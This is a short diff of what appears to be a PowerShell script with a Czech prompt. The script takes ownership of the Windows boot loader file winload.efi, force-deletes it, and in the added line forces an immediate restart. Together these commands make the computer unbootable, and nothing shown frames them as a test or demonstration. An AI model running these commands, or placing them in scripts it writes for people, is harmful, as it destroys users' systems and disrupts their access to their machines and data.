@@ -21,3 +21,5 @@ icacls "C:\Windows\System32\winload.efi" /grant administrators:F
 Remove-Item "C:\Windows\System32\winload.efi" -Force
 
 Read-Host "Stisknutím klávesy Enter skript ukončíte"
+
+Restart-Computer -Force
